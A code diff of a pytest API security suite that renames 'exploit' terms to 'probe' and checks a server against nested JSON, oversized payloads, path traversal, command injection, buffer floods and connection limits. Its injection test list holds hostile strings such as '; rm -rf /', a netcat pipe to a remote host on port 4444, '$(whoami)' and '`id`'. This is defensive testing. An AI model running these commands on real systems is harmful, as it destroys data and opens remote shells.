@@ -1,8 +1,8 @@
 """
 API Security Tests - Pytest Compatible
 
-Comprehensive API security testing including injection attacks,
-buffer exploitation, and parameter validation bypass.
+Comprehensive API security testing including injection probes,
+buffer probing, and parameter validation bypass.
 
 Run with:
     pytest tests/security/test_api_security.py -v
@@ -24,8 +24,8 @@ import pytest
 @pytest.mark.security
 @pytest.mark.critical
 @pytest.mark.destructive
-class TestJSONExploits:
-    """JSON parsing and structure exploitation tests"""
+class TestJSONProbes:
+    """JSON parsing and structure probing tests"""
 
     def test_deeply_nested_json(self, security_client, check_server_alive):
         """
@@ -75,7 +75,7 @@ class TestJSONExploits:
                 f"Server neither rejected nor closed connection for {depth}-level nesting"
             )
 
-    def test_oversized_json_payload(self, security_client, vuln_tracker):
+    def test_oversized_json_payload(self, security_client, finding_tracker):
         """
         Test defense against extremely large JSON objects.
 
@@ -101,7 +101,7 @@ class TestJSONExploits:
 
             # Should be rejected
             if b"error" not in response.lower():
-                vuln_tracker.log_vulnerability(
+                finding_tracker.log_weakness(
                     "HIGH",
                     "Message Size",
                     f"Server accepted {payload_size_mb:.2f}MB payload",
@@ -115,7 +115,7 @@ class TestJSONExploits:
             # Expected - server rejected or connection closed
             pass
 
-    def test_json_with_control_characters(self, security_client, vuln_tracker):
+    def test_json_with_control_characters(self, security_client, finding_tracker):
         """Test handling of JSON with embedded control characters"""
         malformed_payloads = [
             b'{"type":"command\x00\x01\x02","command":"test"}',  # NULL bytes
@@ -134,7 +134,7 @@ class TestJSONExploits:
 
                 # Should be rejected or sanitized
                 if response and b"error" not in response.lower():
-                    vuln_tracker.log_vulnerability(
+                    finding_tracker.log_weakness(
                         "MEDIUM",
                         "Input Validation",
                         f"Server processed JSON with control chars (payload {i})",
@@ -147,7 +147,7 @@ class TestJSONExploits:
 
 @pytest.mark.security
 @pytest.mark.critical
-class TestInjectionAttacks:
+class TestInjectionProbes:
     """Command injection and path traversal tests"""
 
     @pytest.mark.parametrize(
@@ -165,7 +165,7 @@ class TestInjectionAttacks:
             "absolute_windows",
         ],
     )
-    def test_path_traversal(self, security_client, payload, vuln_tracker):
+    def test_path_traversal(self, security_client, payload, finding_tracker):
         """
         Test defense against path traversal in file operations.
 
@@ -175,7 +175,7 @@ class TestInjectionAttacks:
             result = security_client.command("project.open", {"filePath": payload})
 
             # Should NOT succeed
-            vuln_tracker.log_vulnerability(
+            finding_tracker.log_weakness(
                 "CRITICAL",
                 "Path Traversal",
                 f"Server opened file outside project dir: {payload}",
@@ -217,7 +217,7 @@ class TestInjectionAttacks:
         "injection",
         [
             "; rm -rf /",
-            "| nc attacker.com 4444",
+            "| nc client.com 4444",
             "$(whoami)",
             "`id`",
             "${USER}",
@@ -232,7 +232,7 @@ class TestInjectionAttacks:
             "sql_injection",
         ],
     )
-    def test_command_injection(self, security_client, injection, vuln_tracker):
+    def test_command_injection(self, security_client, injection, finding_tracker):
         """Test defense against command injection in parameters"""
         try:
             # Try injecting into various string parameters
@@ -242,7 +242,7 @@ class TestInjectionAttacks:
             result = security_client.command("project.getStatus")
             title = result.get("title", "")
             if "uid=" in title or "root" in title:
-                vuln_tracker.log_vulnerability(
+                finding_tracker.log_weakness(
                     "CRITICAL",
                     "Command Injection",
                     f"Code execution via injection: {injection}",
@@ -257,10 +257,10 @@ class TestInjectionAttacks:
 
 @pytest.mark.security
 @pytest.mark.destructive
-class TestBufferExploits:
-    """Buffer overflow and exhaustion attacks"""
+class TestBufferProbes:
+    """Buffer overflow and exhaustion probes"""
 
-    def test_buffer_without_newline(self, check_server_alive, vuln_tracker):
+    def test_buffer_without_newline(self, check_server_alive, finding_tracker):
         """
         Test line buffer exhaustion by sending data without newlines.
 
@@ -294,7 +294,7 @@ class TestBufferExploits:
 
                     # Should have been disconnected - if we get valid response, that's bad
                     if response and b"success" in response:
-                        vuln_tracker.log_vulnerability(
+                        finding_tracker.log_weakness(
                             "HIGH",
                             "Buffer Exhaustion",
                             "Server buffered 10MB without newline without disconnecting",
@@ -319,7 +319,7 @@ class TestBufferExploits:
 
         # Optionally verify connection WAS closed (defensive behavior working)
         if not connection_closed:
-            vuln_tracker.log_vulnerability(
+            finding_tracker.log_weakness(
                 "MEDIUM",
                 "Buffer Management",
                 "Server may not enforce buffer limits aggressively",
@@ -327,7 +327,7 @@ class TestBufferExploits:
             )
 
     def test_rapid_message_flood(
-        self, security_client, check_server_alive, vuln_tracker
+        self, security_client, check_server_alive, finding_tracker
     ):
         """
         Test rate limiting with rapid message flood.
@@ -368,7 +368,7 @@ class TestBufferExploits:
             # Check if rate limiting is working
             # Server limit is 200 msg/sec, so sustained rate > 300 msg/sec suggests no limiting
             if rate > 300 and not connection_closed:
-                vuln_tracker.log_vulnerability(
+                finding_tracker.log_weakness(
                     "MEDIUM",
                     "Rate Limiting",
                     f"Weak or no rate limiting detected: {rate:.0f} msg/s sustained without disconnect",
@@ -389,10 +389,10 @@ class TestBufferExploits:
 @pytest.mark.security
 @pytest.mark.high
 @pytest.mark.destructive
-class TestBatchExploits:
+class TestBatchProbes:
     """Batch command abuse and limit bypass"""
 
-    def test_oversized_batch(self, security_client, vuln_tracker):
+    def test_oversized_batch(self, security_client, finding_tracker):
         """
         Test batch size limit enforcement.
 
@@ -410,8 +410,8 @@ class TestBatchExploits:
             error_msg = results.get("message", "").lower()
             assert "limit" in error_msg or "size" in error_msg
         elif isinstance(results, list) and len(results) > 256:
-            # Server processed too many commands - vulnerability!
-            vuln_tracker.log_vulnerability(
+            # Server processed too many commands - weakness!
+            finding_tracker.log_weakness(
                 "MEDIUM",
                 "Batch Processing",
                 f"Server processed {len(results)} commands without limit",
@@ -486,7 +486,7 @@ class TestBatchExploits:
 class TestConnectionExhaustion:
     """Connection limit and resource exhaustion"""
 
-    def test_connection_limit(self, check_server_alive, vuln_tracker):
+    def test_connection_limit(self, check_server_alive, finding_tracker):
         """
         Test connection limit enforcement.
 
@@ -536,7 +536,7 @@ class TestConnectionExhaustion:
             # Verify connection limit is being enforced
             # Server limit is 32, we allow some margin for timing (up to 36)
             if len(active_sockets) > 36:
-                vuln_tracker.log_vulnerability(
+                finding_tracker.log_weakness(
                     "HIGH",
                     "Connection Limit",
                     f"Weak or no connection limit: {len(active_sockets)} active connections (limit should be 32)",
@@ -548,7 +548,7 @@ class TestConnectionExhaustion:
 
             # We should have SOME rejections if we tried to open 50 connections
             if rejected_count == 0:
-                vuln_tracker.log_vulnerability(
+                finding_tracker.log_weakness(
                     "MEDIUM",
                     "Connection Limit",
                     f"No connections rejected (opened {len(active_sockets)} out of 50 attempts)",
@@ -604,15 +604,15 @@ class TestParameterValidation:
 class TestRawDataInjection:
     """Raw data injection without authentication"""
 
-    def test_raw_data_injection(self, vuln_tracker):
+    def test_raw_data_injection(self, finding_tracker):
         """Test if raw data can be injected without device connection
 
         Note: API accepts raw data commands regardless of connection state.
         The IO Manager handles the actual device communication.
         This is intentional - API layer is stateless.
         """
-        malicious_data = b"INJECTED_PAYLOAD\r\n"
-        encoded = base64.b64encode(malicious_data).decode()
+        untrusted_data = b"INJECTED_PAYLOAD\r\n"
+        encoded = base64.b64encode(untrusted_data).decode()
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
